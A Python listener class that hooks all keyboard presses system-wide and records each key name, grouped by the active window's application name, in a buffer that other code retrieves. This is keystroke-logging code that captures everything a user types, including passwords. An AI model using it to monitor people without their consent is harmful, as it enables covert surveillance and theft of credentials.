from interface.listener_interface import ListenerInterface
import keyboard
import re
import pygetwindow as gw

class Listener(ListenerInterface):
    def __init__(self):
        super().__init__()
        self.buffer = {}

    def get_buffer(self):
        temp_buffer = self.buffer
        self.buffer = {}
        return temp_buffer
    
    def buffer_has_data(self):
        return len(self.buffer)

    # Takes only the application name
    def key_handler(self, key):
        window = gw.getActiveWindow().title

        match = re.search(r'[\w\s]+$', window)  
        if match:
            window_name = match.group(0).strip()

        if window_name not in self.buffer:
            self.buffer[window_name] = []
        self.buffer[window_name].append((key.name))

    def start(self):
        keyboard.on_press(self.key_handler)


    def stop(self):
        keyboard.wait('esc') 
        keyboard.unhook_all()  

